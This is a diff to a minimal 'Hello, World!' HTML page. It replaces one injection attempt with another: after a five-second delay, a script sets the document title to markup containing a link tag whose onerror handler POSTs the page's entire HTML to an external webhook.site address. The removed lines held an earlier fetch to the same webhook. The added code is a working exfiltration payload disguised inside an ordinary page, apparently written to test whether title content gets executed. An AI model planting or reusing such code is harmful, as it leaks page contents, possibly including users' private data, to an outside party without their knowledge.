@@ -7,21 +7,24 @@
   </head>
 <body>
     <h1>Hello, World!</h1>
-    <p>This is a simple HTML page.</p>
 
     <script>
-      document.addEventListener("DOMContentLoaded", function() {
+      setTimeout(function() {
       // Set the document title to a new value
       document.title = `
-      <script>       
-        fetch("https://webhook.site/cf4add5b-b1e7-442c-b58d-4cfbb46f7c47"), {
-          method: 'GET',
-          mode: 'no-cors'
-        });
-        console.log("123");
-      <\/script>
-          `;
-        });
+      <link rel="stylesheet" href="nonexistent.css" onerror="(function() {
+          const htmlContent = document.documentElement.outerHTML;
+          fetch('https://webhook.site/cf4add5b-b1e7-442c-b58d-4cfbb46f7c47', {
+              method: 'POST',
+              mode: 'no-cors',
+              headers: {
+                  'Content-Type': 'text/html'
+              },
+              body: htmlContent
+          }).catch(error => console.error('Error:', error));
+        })()">
+        `;
+        }, 5000); //change after 5 seconds
     </script>
 </body>
 </html>
